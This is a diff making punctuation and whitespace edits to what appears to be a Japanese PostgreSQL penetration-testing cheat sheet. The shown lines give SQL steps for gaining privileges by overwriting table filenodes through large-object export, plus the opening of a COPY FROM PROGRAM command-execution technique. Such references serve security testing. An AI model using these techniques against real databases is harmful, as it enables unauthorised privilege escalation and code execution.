@@ -187,7 +187,7 @@ COPY (SELECT convert_from(decode('<BASE64_PAYLOAD>','base64'),'utf-8')) TO '/pat
 
 ## ローカルファイル書き込みによるテーブルデータ更新
 
-ファイル書き込み権限がある場合、データディレクトリ内のファイルノードを直接上書きして権限奪取が可能
+ファイル書き込み権限がある場合、データディレクトリ内のファイルノードを直接上書きして権限奪取が可能。
 
 1. データディレクトリ取得
 ```sql
@@ -198,12 +198,12 @@ SELECT setting FROM pg_settings WHERE name = 'data_directory';
 ```sql
 SELECT pg_relation_filepath('<table>')
 ```
-    
+
 3. ラージオブジェクト経由で編集済みファイルノードを配置
 ```sql
 SELECT lo_from_bytea(<oid>,decode('<BASE64_EDITED_FILENODE>','base64'))
 ```
-    
+
 4. 元のファイルを上書き
 ```sql
 SELECT lo_export(<oid>,'<full_path>')
@@ -213,7 +213,8 @@ SELECT lo_export(<oid>,'<full_path>')
 
 ### COPY ... FROM PROGRAM による実行
 
-9.3以降、スーパーユーザーまたは pg_execute_server_program メンバーが利用可能
+9.3以降、スーパーユーザーまたは pg_execute_server_program メンバーが利用可能。
+
 ```sql
 -- 基本的なコマンド実行
 CREATE TABLE cmd_exec(cmd_output text);
